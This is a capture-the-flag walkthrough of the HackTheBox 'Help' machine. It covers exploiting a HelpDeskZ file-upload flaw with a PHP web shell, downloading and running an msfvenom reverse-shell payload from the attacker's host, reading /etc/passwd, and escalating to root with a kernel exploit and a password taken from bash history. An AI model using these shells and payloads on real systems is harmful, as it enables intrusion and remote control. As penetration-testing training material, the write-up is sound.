# Help - HackTheBox

Time to start doing these properly...

## Scanning

Start with TCP:

```
nmap -sC -sV --top-ports -n -vvvv -O 10.10.10.121
```
After cleaning up the output with a few `grep` commands:

```
➜  Help git:(master) cat Help.gnmap| clean
22/open/tcp//ssh//OpenSSH7.2p2Ubuntu4ubuntu2.6(UbuntuLinux;protocol2.0)/
80/open/tcp//http//Apachehttpd2.4.18((Ubuntu))/
885/filtered/tcp//unknown///
3000/open/tcp//http//Node.jsExpressframework/   IgnoredState:closed(8302)       SeqIndex:259   IPIDSeq:Allzeros 
```

Move onto UDP, just in case:

```
udp-protoscanner.pl 10.10.10.121 > udpscan_Help
```

Nothing happening of interest on UDP

Running `enum4linux` against the host is NOISY!

```
enum4linux 10.10.10.121 > enum_results
```

(With the UDP coming up blind the enum script was mostly redundant)

### Port 80 (lowest hanging fruit HTTP)

While we wait for that to finish, fire off some `curl` commands:

```
curl -X GET http://10.10.10.121
```

We just get the Apache "It Works" page (the default "index.html" for a fresh install)

```
curl -x OPTIONS http://10.10.10.121
```

OPTIONS doesn't give up the goods sadly. So we're going to have to do some directory fuzzing and see what we can find.

```
➜  Help git:(master) ✗ wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.10.121/FUZZ 
```

`WFuzz` finished pretty quickly, with two of the directories giving a 301 (Permanently Moved) redirect which we didn't follow (this can be done with the `-L` or `--follow` flag when you run wfuzz from the command line), and the three Apache access files giving us a "403" (Forbidden) response. We'll give them a try later with a different UserAgent, see if it makes a difference. 

```
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.121/FUZZ
Total requests: 4614

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

002020:  C=200    375 L      968 W        11321 Ch        "index.html"
002145:  C=301      9 L       28 W          317 Ch        "javascript"
003588:  C=403     11 L       32 W          300 Ch        "server-status"
003911:  C=301      9 L       28 W          314 Ch        "support"
000001:  C=200    375 L      968 W        11321 Ch        ""
000012:  C=403     11 L       32 W          296 Ch        ".htaccess"
000011:  C=403     11 L       32 W          291 Ch        ".hta"
000013:  C=403     11 L       32 W          296 Ch        ".htpasswd"

Total time: 22.53847
Processed Requests: 4614
Filtered Requests: 4606
Requests/sec.: 204.7166
```

- index.html is the default Apache file, we've curled this already
- javascript `301`, definitely worth a nose
- server-status `403`
- support `301`, another one that's worth a nose
- "" `200` with the same content legth as index.html, guess what that is :) 
- 3 x `.ht` Apache files, if we could access these we'd have some fun, but it doesn't look like we can

> OK there is lots to look at here, we'll come back to it once we clarify that this is where we need to spend our time

### Port 22 (SSH)

See if we can do some enum on the SSH server running on the rarget host

```
➜  Help git:(master) ✗ ls -l /usr/share/nmap/scripts | grep ssh
-rw-r--r-- 1 root root  5659 May 15  2018 ssh2-enum-algos.nse
-rw-r--r-- 1 root root  1207 May 15  2018 ssh-auth-methods.nse
-rw-r--r-- 1 root root  3068 May 15  2018 ssh-brute.nse
-rw-r--r-- 1 root root 15465 May 15  2018 ssh-hostkey.nse
-rw-r--r-- 1 root root  5970 May 15  2018 ssh-publickey-acceptance.nse
-rw-r--r-- 1 root root  2920 May 15  2018 ssh-run.nse
-rw-r--r-- 1 root root  1446 May 15  2018 sshv1.nse
```

Nope, not in there... Oh... it's in MSF... right

`service postgresql start`

`msfconsole -q`

Can we actually connect? (yes we got a hit back on `nmap` but still)

`nc 10.10.10.121 22`

```
➜  Help git:(master) ✗ nc -v 10.10.10.121 22
10.10.10.121: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.121] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6

Protocol mismatch.
```

Yes.

We have no creds, and it's too early to start bruteforcing...

### Port 885 (No idea, let's find out!)

False positive, or there is some weird port knocking/firewall shenanigans happening as the result was filtered and not dropped. So it accepted our SYN packet, but just didn't send anything back.

We may end up coming back here later

### Port 3000 (NodeJS??)

NodeJS usually likes to run on port 3000 (for some reason) and we're getting a report back on `nmap` that it's running an ExpressJS web-server. 

```
curl -X GET http://10.10.10.121:3000
```
We get the following message after sending the above command:

```
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```

Checking OPTIONS:

```
curl -X OPTIONS http://10.10.10.121:3000
```

Just GET, and HEAD

Let's see what else is on this port:

```
wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.10.121:3000/FUZZ 
```

Nothing... What about with a different (larger) wordlist?

```
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.10.121:3000/FUZZ  
```

No bueno.

Just that message it seems. 

![austinpowers](images/austinpowers.png)

Something weird (for a website) did happen when I connected via `nc` 

```
➜  Help git:(master) ✗ nc 10.10.10.121 3000
GET / HTTP/1.1

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 81
ETag: W/"51-gr8XZ5dnsfHNaB2KgX/Gxm9yVZU"
Date: Mon, 11 Feb 2019 19:21:11 GMT
Connection: keep-alive

{"message":"Hi Shiv, To get access please find the credentials with given query"}

GET /uploads/ HTTP/1.1

HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 147
Date: Mon, 11 Feb 2019 19:21:44 GMT
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /uploads/</pre>
</body>
</html>
Connection: close
```

I had a "web terminal" not exactly, but my connection wasn't going anywhere... Might just be something to put in the back pocket for later...

```
xurl http://10.10.10.121:3000/\#/
{"message":"Hi Shiv, To get access please find the credentials with given query"}

curl http://10.10.10.121:3000/\#/chart
{"message":"Hi Shiv, To get access please find the credentials with given query"}                                                                                                            

curl http://10.10.10.121:3000/\#/wahtever
{"message":"Hi Shiv, To get access please find the credentials with given query"} 

curl http://10.10.10.121:3000/\#/errrororororororororor
{"message":"Hi Shiv, To get access please find the credentials with given query"}#  
```

Got excited for a second, but it just responds to anything after the `#`...

Let's head back to port 80, there was a lot more to look at there, though we'll keep an eye out for something relating to this Express server as it won't just be sat there with a weird message for now reason, right?

### Port 80 (Redux)

Heading back to Port 80, and behind the `support` endpoint we find...

*HelpDeskz* 

![ohboy](images/ohboy.png)

HelpDeskz is an OpenSource HelpDesk system, it's pretty cool if you're a small company and you just need *something* to raise tickets with. But most importantly, it's __Open Source__ so we can go check out the code on ze Github.

```
git clone https://github.com/evolutionscript/HelpDeskZ-1.0.git
```

Cool, we have no idea if this is the same version initially, but we can make a pretty well educated guess that it is since the last commit was back in 2016, and this is a new box on HTB.

## Googling Around

Well this interesting. Googling for "HelpDeskz" exploit gives us a whole load of stuff from exploitdb. This is a good sign we're on the right track. 

## Code Review Time!

I wanted to do the "OhBoy" png again, but it would be overused. But yeah, time to do a code review and find some derpy stuff.

First off before we start we'll check the "Issues" on the Github page, "bugs" and "won't fix" can sometimes contain gems of information. Doesn't look like there is anything here though. 


## Playing with the system

First of all we need a dev environment, because I don't want to mess my system up

[DevSpace Vagrant Image](https://github.com/arifulhb/devspace)

That'll do nicely.

Now clone the Git repo into it and follow the installation instructions (with the caveat that we're using the "public_html" folder on the vagrant image, so that'll be our prefix on any URL we type)

OK, we're in and we can use the system just like we would if we were an anonymouse user. 

Let's submit a ticket and watch the database.

```
mysql> describe hdz_tickets;
+---------------+--------------+------+-----+---------+----------------+
| Field         | Type         | Null | Key | Default | Extra          |
+---------------+--------------+------+-----+---------+----------------+
| id            | int(11)      | NO   | PRI | NULL    | auto_increment |
| code          | varchar(255) | NO   | MUL | NULL    |                |
| department_id | int(11)      | NO   |     | 0       |                |
| priority_id   | int(11)      | NO   |     | 0       |                |
| user_id       | int(11)      | NO   |     | 0       |                |
| fullname      | varchar(255) | NO   |     | NULL    |                |
| email         | varchar(255) | NO   |     | NULL    |                |
| subject       | varchar(255) | NO   |     | NULL    |                |
| api_fields    | text         | YES  |     | NULL    |                |
| date          | int(11)      | NO   |     | 0       |                |
| last_update   | int(11)      | NO   |     | 0       |                |
| status        | smallint(2)  | NO   |     | 1       |                |
| previewcode   | varchar(12)  | YES  |     | NULL    |                |
| replies       | int(11)      | NO   |     | 0       |                |
| last_replier  | varchar(255) | YES  |     | NULL    |                |
| custom_vars   | text         | YES  |     | NULL    |                |
+---------------+--------------+------+-----+---------+----------------+
16 rows in set (0.00 sec)
```

```
mysql> select fullname,date from hdz_tickets;
+-----------+------------+
| fullname  | date       |
+-----------+------------+
| something | 1549916179 |
+-----------+------------+
1 rows in set (0.00 sec)
```

Cool now we not only know the table structure, but we know the values we need to pull out as well. 

OK, so based on the code we saw earlier, if we grab the `fullname` and the `date`, `md5sum` and then add the `extension` to the end of it, we should be able to get the same value as one of the files in the "/uploads/" folder.

```
vagrant@devspace:~$ echo -n "args.txt1549916179" | md5sum
bb72ef5c282d31ebb2366a7e6a9ccf15  -
vagrant@devspace:~$ ls -la /var/www/html/public_html/uploads/tickets/ | grep bb72ef5c282d31ebb2366a7e6a9ccf15
-rw-rw-r-- 1 vagrant www-data   79 Feb 11 20:16 bb72ef5c282d31ebb2366a7e6a9ccf15.txt
```

[Contact](images/contact.jpg)

And now if we go to the uploads folder, we should be able to access our .txt file that we uploaded.

```
http://192.168.33.10/public_html/uploads/tickets/bb72ef5c282d31ebb2366a7e6a9ccf15.txt
```

Let's try with a quick PHP file.

```
<?php
$a = $_GET["a"];
echo system($a);
?>
```

Upload it, grab the timestamp, and then generate the hash.

```
echo -n "phpshell.php1549923644" | md5sum | sed 's/  -//' | sed 's/$/.php/'
```

Now we can go to `http://192.168.33.10/public_html/uploads/tickets/<md5sum>.php` and use our `a?` parameter to pass in a shell command. 

```
http://192.168.33.10/public_html/uploads/tickets/9f40f4d0870376408d34edc39180e2d1.php?a=cat%20/etc/passwd
```

Tango Down!

[tango](images/tangodown.jpg)


## Testing in Live (1 of many)

Let's try this over on the live server, even though we know we're missing one ingredient: __the timestamp__.


Straight away we get the following response: 

```
File is not allowed.
```

Back to the testing lab!

## Messing with the filetypes

What happens when we upload something that triggers that second response? And how do we trigger it?

We can speculate that the developers of this challenge have removed `php` from the allowed filetypes on the server. We've already seen in the code that all the information is coming from the database, including the allowed filetypes. So if we modify our system to reject `php` files and see what happens that'll be a good starting place.

OK, so after quickly brushing up on my SQL:

```
DELETE FROM hdz_file_types WHERE type = "php";
```

Check that hit the right row:

```
mysql> select * from hdz_file_types;                                                                                                                                                                            
+----+------+------+                                                                       
| id | type | size |                                                                       
+----+------+------+                                                                       
|  1 | gif  | 0    |                                                                       
|  2 | png  | 0    |                                                              
|  3 | jpeg | 0    |
|  4 | jpg  | 0    |
|  5 | ico  | 0    |
|  6 | doc  | 0    |
|  7 | docx | 0    |
|  8 | xls  | 0    |
|  9 | xlsx | 0    |
| 10 | ppt  | 0    |
| 11 | pptx | 0    |
| 12 | txt  | 0    |
| 13 | htm  | 0    |
| 14 | html | 0    |
| 16 | zip  | 0    |
| 17 | rar  | 0    |
| 18 | pdf  | 0    |
+----+------+------+
17 rows in set (0.00 sec)
```

Noice.

Check the response from the server annnnd: 

```
File is not allowed.
```

We're on the right track, that's the "2nd" response, the one we wanted to get. Let's check out the database and see what actually happened.

```
function verifyAttachment($filename){
	global $db;	
	$namepart = explode('.', $filename['name']);
	$totalparts = count($namepart)-1;
	$file_extension = $namepart[$totalparts];
	if(!ctype_alnum($file_extension)){
		$msg_code = 1;
	}else{
		$filetype = $db->fetchRow("SELECT count(id) AS total, size FROM ".TABLE_PREFIX."file_types WHERE type='".$db->real_escape_string($file_extension)."'");
		if($filetype['total'] == 0){
			$msg_code = 2;
		}elseif($filename['size'] > $filetype['size'] && $filetype['size'] > 0){
			$msg_code = 3;
			$misc = formatBytes($filetype['size']);
		}else{	
			$msg_code = 0;
		}
	}
	$data = array('msg_code' => $msg_code, 'msg_extra' => $misc);
	return $data;
}
```

And there is nothing in the database...

Ummm, OK so trying a few different versions of `.php` didn't seem to work either.

- ` .php`
- `php5`
- `phtml`

None of them seemed to work... what about no extension?

Nope...

Combinations?

- `html.php`
- `php.html` (this one showed promise!)

OK, so the second one uploaded, obviously it ignored the `php` code and we couldn't get code ex. But we did get a HTML file posted, and we could navigate to it. 

So what if we embed some `php` inside a valid HTML document? (with very little hope that this is going to work...)

```
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
	<script>
		<?php
		$a = $_GET['a'];
		echo system($a);
	</script>	
</body>
</html>
```

That *shouldn't* work, because the HTML document doesn't have anywhere to print the data back the user. So the fact that it didn't is good, it shows that we aren't dealing with something crazy here.

We could try to do some SQL injection into the type parameter and try and get it to return more than one row, although it isn't using a LIKE it's using a direct comparsion `=`, let's try and see. Can't hurt. 

- `phpshell.*`
- `phpshell.%`

Both of them showed the same "Invalid File Extension" error, and neither one seemed to affect the database...

But it seems like the database doesn't care!! (I hadn't looked at the filesystem for a file)

```
vagrant@devspace:~$ ls -la /var/www/html/public_html/uploads/tickets/
total 72
drwxrwxr-x 1 vagrant www-data 4096 Feb 11 23:18 .
drwxrwxr-x 1 vagrant www-data 4096 Feb 11 20:03 ..
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 20:45 1e97f00e3806687afb1292346ff06e96.php
-rw-rw-r-- 1 vagrant www-data  147 Feb 11 23:18 41d27e3c8fba8179740c954447d996c5.%
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:53 446919b2f8502db87b60d7f191cd33e1.phtml
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:46 48e7323f811015d59395a96e51464fc6.php5
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:45 51ae33983c53e9b6eb67c1405d6073dc.php
-rw-rw-r-- 1 vagrant www-data 3821 Feb 11 20:16 5f7b0c5a5cc3173b5f92ed406c88b3da.md
-rw-rw-r-- 1 vagrant www-data  147 Feb 11 23:15 6fa9219d617968a7aa04ba1e067a5f7c.*
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:20 9f40f4d0870376408d34edc39180e2d1.php
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:46 a24f7659cc3a7e026842326fa4932e0c.php
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:38 b6079d21637a3d96ec8642d2e1347d55.php
-rw-rw-r-- 1 vagrant www-data   79 Feb 11 20:16 bb72ef5c282d31ebb2366a7e6a9ccf15.txt
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:57 c775e0a660c279717d604118f6fdd698.html
-rw-rw-r-- 1 vagrant www-data  147 Feb 11 23:05 d6c4cb8d8dcd2ebb0856d9272de4e828.html
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:55 e09f8223be0e2fe3abaafd76aca77e67.
-rw-rw-r-- 1 vagrant www-data   43 Feb 11 22:57 e675a786bb29f7b7f9ce0fafa504266b.php
-rw-rw-r-- 1 vagrant www-data  202 Feb 11 20:03 index.php
```

Recognise some of those filenames!? :) 

So we actually have a whole load of shells! We just need to find them!

> Looking back over the code, the `submit_ticket_controller` doesn't appear to call anything that would delete the file, it just uploads it... 



## TIME TRAVELLING! 

OK, so I was running [THIS](https://www.exploit-db.com/exploits/40300) exploit to try and find the shell, but it wasn't working. And it was driving me mad...

Then finally spotted it. Took far too long, and I had to make sure the clock on my system was properly sync'ed up. 

```
HTTP/1.1 200 OK
Date: Mon, 11 Feb 2019 23:36:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 4453
Connection: close
Content-Type: text/html; charset=UTF-8
```

That isn't right...

```
Mon 11 Feb 23:37:18 GMT 2019
```

That's my systemtime above...

It's about a minute out... 

(This doesn't end up mattering much for us, we were being throw off by some of the forum comments about timezones. If we were in the US it would probably matter a lot more, but we're not, so it doesn't)


## Port 3000 (because I was getting impatient with Port 80)

I couldn't help but wonder what was going on with that Express server, so I just Googled the message it responded with.

And I got a *single* result.

[This Pastebin](https://pastebin.com/5ks2nFdV)

In it, it makes mention of a few imports but mostly it's using `graphql` which is an "Query language for your API" (something that I probably glanced over when I was looking at this kind of thing for my dissertation)

[GraphQL Documentation](https://graphql.org/learn/serving-over-http/)

OK so it looks like we can do a query by giving the server a URL like the following:

```
10.10.10.121:3000/graphql?query=
```

Writing any old garbage in there gives us a proper response, so we know we're actually interacting with a thing:

```
{"errors":[{"message":"Syntax Error GraphQL request (1:1) Unexpected Name \"whoami\"\n\n1: whoami\n   ^\n","locations":[{"line":1,"column":1}]}]}
```

We have an error in our Syntax! 

Considering we've never used this before I'd be surprised if we didn't! But we don't really know what we're doing with this thing, it might be time to do some Googling.

TO THE GOOGLEMOBILE!

If you Google "graphql pentesting" on Google, the fifth or sixth result is a Tweet:

[Said Tweet](https://twitter.com/coffeetocode/status/1047598473871163393)

In it they provide the following snippet:

```
GET: https://example.com/graphql?query= {__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
```

Let's give it a try!

```
http://10.10.10.121:3000/graphql?query={__schema%20{%0Atypes%20{%0Aname%0Akind%0Adescription%0Afields%20{%0Aname%0A}%0A}%0A}%0A}
```

Oh cool we got a JSON dump back. 

We should go on a little research adventure into GraphQL because it's not something I'm very familiar with.

As of this moment the only things I know are; how to send one query that works and many that don't, and I know that the general principle behind this thing is that it's designed to dump all of the data at once, not drip-feed it out per endpoint like a REST API would.




## Spawning a Shell

OK, so we know now that the `verifyAttachment` method *doesn't* call the delete function as it should.

You'd think the general logic would be something like:

- Get the file
- Move it to somewhere like /tmp
- Check the permission
- Decide if we like it
- If we do, move it to /uploads/
- If we don't like it, delete it from /tmp

Well they seem to have skipped those last two if statements, and the whole "move to /tmp" is but a pipe-dream.

The logic for file uploads actually looks like this:

- Get the file
- Chill

Even if we get the "File Not Allowed" or "Invalid Extension", nothing actually changes, our file is still uploaded and renamed. So we're golden. Nothing to bypass.

I removed all the extra stuff from our `php` shell so it looks more like:

```
<?php
$a = $_GET['a'];
echo system($a);
?>
```

Upload that to the HelpDeskz via [the ticket submission page](http://10.10.10.121/support/?v=submit_ticket), then run the exploit we found earlier, using the path we already know for our `baseurl` and the name of our file as the `filename`.

```
python exploit.py http://10.10.10.121/support/uploads/tickets/ g_shell.php
```

Check the page is responding:


```
http://10.10.10.121/support/uploads/tickets/525fd02f530e81b8a207142174137194.php
```

Do a test command to check it works OK:

```
http://10.10.10.121/support/uploads/tickets/525fd02f530e81b8a207142174137194.php?a=cat%20/etc/passwd
```

Noice. Code execution. 

Create a Reverse Shell in `msfvenom`:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f elf > plx69 
```

Just a quick aside: `msfvenom --list payloads | grep target_os` is a dope way to quickly figure out which payload you need to specify for your shell, just replace target_os with whatever you want to target "linux", "windows", etc.

Fire up a python SimpleHTTPServer with `-m` then , use our webshell to do:

```
http://10.10.10.121/support/uploads/tickets/525fd02f530e81b8a207142174137194.php?a=wget http://10.10.14.14:8000/plx69 -P /tmp/plx69
```

Now make sure that the shell is executable:

```
http://10.10.10.121/support/uploads/tickets/525fd02f530e81b8a207142174137194.php?a=chmod 777 /tmp/plx69/plx69
```

> Note: when you use `-P` with `wget` it creates a new folder for the file to live in, so in the example above my shell is going to be in /tmp/plx69/plx69. I spent 15 minutes trying to get a shell back from a directory... Read the `man` pages! 

Now fire up an `nc` listener:

```
nc -lvnp 4444
```

And then fire off the command in the browser, or in a `curl` command like a badass.

```
curl -X GET http://10.10.10.121/support/uploads/tickets/423731a0bba8028092808075df4fe60a.php?a=/tmp/plx69/plx69 
```

And we're in (insert hacker voice)

This shell sucks...

```
python -c "import pty; pty.spawn('/bin/bash')"
```

Much better.


## Getting Root

This was a bit of a let down tbh, I really didn't think it was going to be as easy as it was at first, so I spent a good hour or so just looking around the system for something that'd give me a direction to move in, usual priv-esc checklist, processes, interesting files, SUIDs, GUIDs, but it was just this...

__A Kernel Exploit__

*sigh*

`uname -a` Gave up the goods, and with it being one of the first things I usually grab on a system, the path to root was super quick compared to user. 

Oh well, nice and easy. Means we can get onto something else!

Google around for the Kernel with the word "exploit" and you'll find two ExploitDB links. 

One works, and one does not. 

[This one worked](https://www.exploit-db.com/exploits/45010)

[This one did not](https://www.exploit-db.com/exploits/44298)

Interestingly a few people seem to have had some success with that second one, my attempts were met with a simple `error: Ivalid Argument` when I tried to run it. 

`gcc` doesn't work on the target machine, and we're not about to fix it. So just build it on your Kali box, it's a 64bit Linux machine, so no need to change anything, just a straight build command.

```
gcc 45010.c -o 45010
```

`wget` that onto the target machine, no need to use the webshell anymore, we've got a "proper" shell to play with.

(Remember to use a /tmp directory, you know you can usually always write in there)

Now make sure it's executable:

```
chmod +x /tmp/45010
```

Now just run it like you would any other binary

```
./rootme
```

And now if you do `whoami` you should see that you are in fact `root` :)

## Another Way to Root

So the kernel exploit is actually *not* the intended way to root on this box. 

If you check the `.bash_history` you can see a bunch of `su` commands with what looks like a password nestled in the middle of them.

`rOOTmEoRdIE`

Trying that after typing `su` doesn't seem to work. 

But if we flip the capitalized letters around:

`RootMeOrDie` 

And give that a try using `su` 

Boosh. We are now root. 

/IQ
